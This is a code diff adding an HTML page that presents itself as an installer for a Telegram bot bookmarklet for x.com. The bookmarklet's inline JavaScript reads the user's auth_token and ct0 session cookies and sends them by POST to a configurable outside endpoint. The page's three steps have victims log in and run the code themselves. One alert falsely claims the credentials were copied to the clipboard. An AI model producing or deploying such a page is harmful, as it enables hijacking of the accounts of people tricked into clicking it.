@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Bot - Bookmarklet Installer</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            margin: 20px 0;
+        }
+        h1 { color: #333; margin-top: 0; text-align: center; }
+        .alert-box {
+            padding: 15px;
+            background: #e3f2fd;
+            color: #0d47a1;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+            margin: 20px 0;
+        }
+        .bookmarklet-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            cursor: grab;
+            user-select: none;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .bookmarklet-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
+        }
+        .step {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border-left: 4px solid #667eea;
+        }
+        .step h3 { margin-top: 0; color: #667eea; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🐦 Telegram Bot - Bookmarklet</h1>
+        
+        <p style="text-align: center; color: #666; margin-bottom: 20px;">
+            One-click Twitter/X credentials to Telegram bot
+        </p>
+        
+        <div class="alert-box">👉 (Drag the button to your bookmarks bar)</div>
+        
+        <div style="text-align: center;">
+            <a href="javascript:
+(function(){
+    'use strict';
+    const cookies = document.cookie.split(';');
+    const auth = cookies.find(c => c.trim().startsWith('auth_token='));
+    const ct0 = cookies.find(c => c.trim().startsWith('ct0='));
+    
+    if (!auth || !ct0) {
+        alert('Please visit x.com while logged in.');
+        return;
+    }
+    
+    const authToken = auth.split('=')[1];
+    const ct0Val = ct0.split('=')[1];
+    
+    alert('Credentials extracted!\\n\\nLoading bot...');
+    
+    const botEndpoint = 'YOUR_BOT_AUTH_ENDPOINT';
+    if (botEndpoint && botEndpoint !== 'YOUR_BOT_AUTH_ENDPOINT') {
+        fetch(botEndpoint, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({auth_token: authToken, ct0: ct0Val})
+        }).then(r => r.ok ? r.json().then(d => alert('✅ ' + (d.message || 'Success!'))) : alert('Bot offline.'))
+        .catch(() => alert('Loading bot offline mode...\\nCredentials copied to clipboard!\\nPaste with /auth'));
+    } else {
+        alert('Bot endpoint not configured.\\nCredentials: auth_token=' + authToken + '\\n       ct0=' + ct0Val);
+    }
+})();
+" 
+            class="bookmarklet-btn" 
+            draggable="true">
+                👉 x.com → Telegram Bot
+            </a>
+        </div>
+        
+        <div style="margin-top: 30px;">
+            <div class="step">
+                <h3>Step 1: Visit x.com</h3>
+                <p>Open <a href="https://x.com" target="_blank" style="color: #667eea;">x.com</a> and log in.</p>
+            </div>
+            
+            <div class="step">
+                <h3>Step 2: Bookmark</h3>
+                <p>Drag the glowing button to your bookmarks bar.</p>
+            </div>
+            
+            <div class="step">
+                <h3>Step 3: Click</h3>
+                <p>Any time you're on x.com, click the bookmarklet!</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
